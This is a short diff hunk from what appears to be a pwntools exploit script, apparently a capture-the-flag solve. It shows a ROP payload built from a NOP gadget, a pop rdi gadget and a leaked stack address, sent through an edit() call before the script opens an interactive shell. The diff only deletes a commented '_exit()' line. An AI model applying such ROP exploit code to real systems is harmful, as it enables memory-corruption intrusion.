@@ -129,9 +129,6 @@ payload = nop_gadget + pop_rdi_gadget + p64(stack_leak, endianness="little") + s
 # pause()
 edit("32", str(len(payload)), payload)
 
-
-# _exit()
-
 p.interactive()
 
 
